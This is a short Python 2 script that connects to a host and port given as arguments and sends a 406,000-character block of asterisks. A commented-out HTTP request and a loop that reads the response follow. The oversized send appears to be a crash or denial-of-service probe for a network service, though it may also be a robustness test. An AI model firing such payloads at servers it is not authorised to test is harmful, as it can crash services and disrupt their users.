import socket
import sys

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)                 
s.connect((sys.argv[1] , int(sys.argv[2])))
s.sendall("*"*406000)
'''
s.sendall("GET /404 HTTP/1.0\r\n\r\n")
while True:
    line = s.recv(4096)
    if line:
        print line
    else:
        break
s.close()
'''
